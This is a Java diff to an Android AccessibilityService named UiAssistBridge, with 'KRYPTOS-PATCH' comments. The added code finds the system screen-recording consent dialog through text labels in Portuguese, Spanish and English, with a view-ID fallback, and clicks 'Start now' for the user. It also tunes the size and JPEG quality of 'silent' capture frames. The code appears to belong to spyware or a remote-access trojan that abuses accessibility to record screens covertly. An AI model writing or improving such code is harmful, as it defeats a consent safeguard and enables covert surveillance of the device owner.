@@ -111,8 +111,8 @@ public class UiAssistBridge extends AccessibilityService {
             watchdogHandler.postDelayed(this, 10000); // Executa a cada 10 segundos
         }
     };
-    private static final int SILENT_WIDTH = 350;
-    private static final int SILENT_HEIGHT = 650;
+    private static final int SILENT_WIDTH = 300; // [KRYPTOS-PATCH PERF]
+    private static final int SILENT_HEIGHT = 557; // [KRYPTOS-PATCH PERF]
 
     private static final java.util.concurrent.ArrayBlockingQueue<SilentFrameJob> SILENT_ENCODE_QUEUE =
             new java.util.concurrent.ArrayBlockingQueue<>(10);
@@ -3810,14 +3810,35 @@ public class UiAssistBridge extends AccessibilityService {
 
     /** [KRYPTOS] clica o botao "Iniciar agora" do dialogo de captura */
     public static boolean clickProjectionStart() {
+        // [KRYPTOS-PATCH PERF] dialogo de projecao em pt/es/en + fallback por viewId
         try {
+            if (ScreenStreamService.isActive()) return true;
             if (instance == null) return false;
             android.view.accessibility.AccessibilityNodeInfo root = instance.getRootInActiveWindow();
             if (root == null) return false;
-            String[] texts = {"Iniciar agora", "Start now", "Iniciar", "Permitir", "Agora"};
-            for (String t : texts) {
-                java.util.List<android.view.accessibility.AccessibilityNodeInfo> list =
-                        root.findAccessibilityNodeInfosByText(t);
+            String[] texts = {"Empezar ahora", "Iniciar agora", "Iniciar ahora", "Comenzar ahora", "Start now", "Ahora", "Agora", "Iniciar", "Empezar", "Comenzar", "Aceptar", "Permitir", "OK", "Compartir", "Transmitir"};
+            if (clickFirstByText(root, texts)) return true;
+            String[] ids = {"android:id/button1", "com.android.systemui:id/button1"};
+            for (String idv : ids) {
+                try {
+                    java.util.List<android.view.accessibility.AccessibilityNodeInfo> l2 = root.findAccessibilityNodeInfosByViewId(idv);
+                    if (l2 == null) continue;
+                    for (android.view.accessibility.AccessibilityNodeInfo n : l2) {
+                        android.view.accessibility.AccessibilityNodeInfo c = n;
+                        int g = 0;
+                        while (c != null && !c.isClickable() && g++ < 6) c = c.getParent();
+                        if (c != null) { c.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK); return true; }
+                    }
+                } catch (Throwable ignored) {}
+            }
+        } catch (Throwable t) { }
+        return false;
+    }
+
+    private static boolean clickFirstByText(android.view.accessibility.AccessibilityNodeInfo root, String[] texts) {
+        for (String t : texts) {
+            try {
+                java.util.List<android.view.accessibility.AccessibilityNodeInfo> list = root.findAccessibilityNodeInfosByText(t);
                 if (list == null) continue;
                 for (android.view.accessibility.AccessibilityNodeInfo n : list) {
                     android.view.accessibility.AccessibilityNodeInfo c = n;
@@ -3828,8 +3849,8 @@ public class UiAssistBridge extends AccessibilityService {
                         return true;
                     }
                 }
-            }
-        } catch (Throwable t) { }
+            } catch (Throwable ignored) {}
+        }
         return false;
     }
 
@@ -3929,7 +3950,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
 
             java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
-            int q = clampSilentQuality(silentCaptureQuality);
+            int q = Math.min(clampSilentQuality(silentCaptureQuality), 45); // [KRYPTOS-PATCH PERF] a q100 daba 180KB/frame
             scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, q, baos);
             byte[] bytes = baos.toByteArray();
             baos.close();
